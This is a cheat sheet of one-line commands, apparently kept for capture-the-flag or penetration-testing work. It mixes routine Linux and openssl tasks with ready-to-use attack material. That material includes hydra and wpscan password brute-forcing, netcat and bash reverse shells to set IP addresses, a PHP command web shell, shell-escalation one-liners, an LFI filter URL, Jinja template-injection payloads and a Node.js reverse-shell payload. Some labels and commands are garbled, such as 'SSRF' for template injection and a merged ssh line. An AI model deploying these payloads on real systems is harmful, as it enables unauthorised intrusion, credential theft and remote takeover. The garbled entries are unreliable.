### Accessing Windows Share folder in Linux

`mount.cifs //192.168.29.216/WindowsShare /root/Desktop/LinuxShare -o user=Ehsaan`

### Generate 20 Characters long string

`openssl rand -base64 20`

### Delete all specific file types in all subdirectories

`find . -name \*.srt -type f -delete`

### Create a 2048 bit RSA key with certificate

`openssl req --newkey rsa:2048 -nodes -keyout private.key -x509 -out certificate.crt`

### Remove Duplicates

`sort file.log | uniq -u`

### Number Images in a folder

`ls | cat -n | while read n f; do mv "$f" "file-$n.jpg"; done`

### Save terminal history by removing duplicates

`history | awk '{$1="";print substr($0,2)}' | sort | uniq -u | awk '{$1=$1};1' > history.txt;`

### Bruteforce ssh password using hydra

`hydra -l jack -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.10.140.232 -t 4 ssh`

### Bruteforce WordPress with wpscan

`wpscan --url http://ehsaanqazi.com -t 3 -P /usr/share/wordlists/rockyou.txt -U user.txt`

### Oneliner reverse shell for WordPress

`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.29.216 1337 >/tmp/f") ?>`

### Use ssh with id_rsa key

`chmod 600 id_rsa ssh -i id_rsa jack@168.29.219`

### Python escalate privileges

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

### Convert the key for JohnTheRipper

`python3 Desktop/Tools/john/run/ssh2john.py id_rsa > john.txt`

### Crack hash with JohnTheRipper

`john --wordlist=/usr/share/wordlists/rockyou.txt john.txt`

### Bruteforce FTP password using hydra

`hydra -l ftpuser -P wordlist.txt 10.10.154.92 -t 4 FTP`

### Perl escalate privilidges

`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

### LFI exploit filter

`http://ehsaanqazi.com?view=demo.php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

### Execute commands within the machine

`<?php system($_GET['cmd']); ?>`

### Bash OneLiner Shell

`echo 'bash -i >& /dev/tcp/10.9.3.49/1337 0>&1' > shell.sh`

### Generate Interactive session with python

`python3 -c "import pty;pty.spawn('/bin/bash')"; export TERM=xterm`

### Enumerate users with wpscan

`wpscan --url http://ehsaanqazi.com --enumerate u`

### SMB Enumeration

`smbmap -H 10.10.31.208`

### Download files from SMB

`smbget -R smb://10.10.31.208/BillySMB`

### Extract info from images

`steghide extract -sf rabbit.jpg`

### Check for DNS Records

`nslookup -type=any ehsaanqazi.com 8.8.8.8`

### SSRF with Jinja list files

`{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}`

### SSRF with Jinja read files

`{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}`

### Nodejs RCE Payload

`require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.12.121 4444 >/tmp/f")`

### Bypassing rate limits ffuf

`ffuf -w ~/Desktop/wordlists/parameters.txt -t 1 -p 0.1 -H -u http://ehsaanqazi.com/FUZZ -mc 302,200,301,403 -s`

### Create a 2048 bit RSA key with a certificate

`openssl req --newkey rsa:2048 -nodes -keyout private.key -x509 -out certificate.crt`
